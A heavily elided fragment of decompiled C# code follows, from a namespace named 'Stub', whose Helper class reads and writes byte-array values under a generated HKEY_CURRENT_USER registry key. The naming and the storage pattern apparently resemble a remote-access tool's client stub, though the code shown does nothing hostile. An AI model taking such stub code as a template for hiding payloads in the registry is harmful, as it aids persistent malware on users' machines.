...
namespace Stub
{
	...
	internal sealed class Helper
	{
		...
		public static readonly string PL = "Software\\" + ID();
		...
		{
			//Discarded unreachable code: IL_0056, IL_006a
			try
			{
		...
		{
			//Discarded unreachable code: IL_001e, IL_002a
			try
			{
				using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(PL, RegistryKeyPermissionCheck.ReadWriteSubTree);
		...
		public static byte[] GetValue(string value)
		{
			...
			try
			{
				using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(PL);
		...
		{
			//Discarded unreachable code: IL_0139, IL_014c
